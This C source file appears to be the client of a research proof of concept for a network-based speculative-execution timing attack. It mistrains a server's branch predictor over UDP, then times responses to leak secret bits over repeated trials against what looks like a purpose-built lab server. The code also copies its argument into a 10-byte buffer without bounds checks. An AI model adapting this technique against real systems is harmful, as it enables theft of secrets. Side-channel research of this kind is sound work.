#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h> //inet_addr
#include <sched.h>
#include <time.h>
#include <stdlib.h>
#include "../timer.h"
#include "network_config.h"
#include <poll.h>

// #define SERVER_ADDRESS "127.0.0.1"
#define NUMBER_OF_TRIALS 500

int main(int argc, char* argv[]) {	
	if (argc != 3) {
		printf("Not enough arguments\n");
		return 1;
	}

	int offset = atoi(argv[2]);
	char SERVER_ADDRESS[16];
	strncpy(SERVER_ADDRESS, argv[1], 16);
	

	// int do_reset = atoi(argv[1]);
	
	int reset_fd, recover_fd, leak_fd;
	struct sockaddr_in reset_socket, recover_socket, leak_socket;
	int reset_socklen, recover_socklen, leak_socklen;
	
	char send_buffer[BUFFER_SIZE];
	char recv_buffer[BUFFER_SIZE];

	reset_fd=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
	recover_fd=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
	leak_fd=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);

	bzero(&reset_socket, sizeof(reset_socket));
    bzero(&recover_socket, sizeof(recover_socket));
	bzero(&leak_socket, sizeof(leak_socket));

	reset_socket.sin_addr.s_addr = inet_addr(SERVER_ADDRESS);
    reset_socket.sin_family=AF_INET;
    reset_socket.sin_port=htons(RESET_PORT);

    recover_socket.sin_addr.s_addr = inet_addr(SERVER_ADDRESS);
    recover_socket.sin_family=AF_INET;
    recover_socket.sin_port=htons(RECOVER_PORT);

	leak_socket.sin_addr.s_addr = inet_addr(SERVER_ADDRESS);
    leak_socket.sin_family=AF_INET;
    leak_socket.sin_port=htons(LEAK_PORT);

	reset_socklen = sizeof(reset_socket);
	recover_socklen = sizeof(recover_socket);
	leak_socklen = sizeof(leak_socket);

	/* struct pollfd fds[2]; */
	/* fds[0].fd = train_fd; */
	/* fds[0].events = POLLIN; */
	/* fds[0].revents = 0; */
	/* fds[1].fd = recover_fd; */
	/* fds[1].events = POLLIN; */
	/* fds[1].revents = 0; */

	/* if (do_reset) { */
	/* 	buffer[0] = 1; */
	/* } */
	/* else { */
	/* 	buffer[0] = 0; */
	/* } */
	TIMER_INIT();
	
	//for (int i = 0; i < 500; i++) {
	for (int i = 0; i < NUMBER_OF_TRIALS; i++) {

		// Reset AMX state
		send_buffer[0] = '1';
		sendto(reset_fd, &send_buffer, BUFFER_SIZE, 0, (struct sockaddr*)&reset_socket, sizeof(reset_socket));
		recvfrom(reset_fd, recv_buffer, BUFFER_SIZE, 0, (struct sockaddr*)&reset_socket, &reset_socklen);

		// First, mistrain the branch predictor
		char leak_buffer[10];
		strcpy(&leak_buffer[0], "0");
		for (int i = 0; i < 10; i++) {
			sendto(leak_fd, &leak_buffer, BUFFER_SIZE, 0, (struct sockaddr*)&leak_socket, sizeof(leak_socket));
			recvfrom(leak_fd, recv_buffer, BUFFER_SIZE, 0, (struct sockaddr*)&leak_socket, &leak_socklen);
		}

		send_buffer[0] = '1';
		// Reset the state
		sendto(reset_fd, send_buffer, BUFFER_SIZE, 0, (struct sockaddr*)&reset_socket, sizeof(reset_socket));
		recvfrom(reset_fd, recv_buffer, BUFFER_SIZE, 0, (struct sockaddr*)&reset_socket, &reset_socklen);
	
		// Now, with the branch predictor mistrained leak the secret bit
		strcpy(&leak_buffer[0], argv[2]);
		sendto(leak_fd, &leak_buffer, BUFFER_SIZE, 0, (struct sockaddr*)&leak_socket, sizeof(leak_socket));
		recvfrom(leak_fd, recv_buffer, BUFFER_SIZE, 0, (struct sockaddr*)&leak_socket, &leak_socklen);

		// Get response time
		TIMER_INIT();
		sendto(recover_fd, send_buffer, BUFFER_SIZE, 0, (struct sockaddr*)&recover_socket, sizeof(recover_socket));
		TIMER_START();
		recvfrom(recover_fd, recv_buffer, BUFFER_SIZE, 0, (struct sockaddr*)&recover_socket, &recover_socklen);
		TIMER_END();
		int64_t recover_time = (int64_t)TIMER_VALUE();

		// Last, ping the server
		send_buffer[0] = '0';
		sendto(reset_fd, &send_buffer, BUFFER_SIZE, 0, (struct sockaddr*)&reset_socket, sizeof(reset_socket));
		TIMER_START();
		recvfrom(reset_fd, recv_buffer, BUFFER_SIZE, 0, (struct sockaddr*)&reset_socket, &reset_socklen);
		TIMER_END();
		int64_t ping_time = (int64_t)TIMER_VALUE();

		// And print the response time
		printf("%s,%"PRId64"\n", argv[2], recover_time-ping_time);
	}

	return 0;
}
